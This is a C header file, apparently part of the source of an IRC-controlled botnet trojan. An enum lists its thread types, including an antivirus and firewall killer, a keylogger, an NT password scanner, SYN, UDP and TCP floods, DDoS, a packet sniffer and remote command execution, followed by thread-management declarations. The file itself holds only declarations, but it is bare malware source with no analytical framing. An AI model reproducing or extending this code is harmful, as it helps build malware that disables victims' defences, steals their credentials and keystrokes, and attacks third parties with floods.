enum {
	MAIN_THREAD,		// Main thread 
	KILLER_THREAD,		// Firewall/AV Killer thread
	IDENT_THREAD,		// Ident Server thread
	HTTP_THREAD,		// HTTP Server thread
	FTP_THREAD,			// FTP Server thread
	TFTP_THREAD,		// TFTP Server thread
	RCMD_THREAD,		// Remote CMD thread
	SCAN_THREAD,		// Port Scanner thread
	NTPASS_THREAD,		// NT Password Scanner thread
	SYN_THREAD,			// Synflood thread
	PING_THREAD,		// Ping thread
	UDP_THREAD,			// UDP thread
	REDIRECT_THREAD,	// Port Redirect thread
	TCP_THREAD,			// Tcp Flood thread
	SOCKS4_THREAD,		// SOCKS4 thread
	DCC_THREAD,			// DCC Transfer thread
	DCCCHAT_THREAD,		// DCC Chat Transfer thread
	VISIT_THREAD,		// Visit URL thread
	DOWNLOAD_THREAD,	// Download thread
	KEYLOG_THREAD,		// Key Logger thread
	UPDATE_THREAD,		// Update thread
	CLONE_THREAD,		// Clone thread
	PSNIFF_THREAD,		// Psniff thread
	DDOS_THREAD,		// DDoS thread
	FIND_THREAD,		// File find thread
	LOG_THREAD,			// Log list thread
	PROC_THREAD			// Process list thread
};

typedef struct threads_struct {
   char name[250];
   int id; 
   int parent;
   int port;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char cnick[16];
   char dir[MAX_PATH];
   char file[MAX_PATH];
   BOOL info;
} thread;

int addthread(char *name, int id, SOCKET sock);
void listthreads(SOCKET sock, char *chan, BOOL notice);
void threadlist(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void threadstop(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
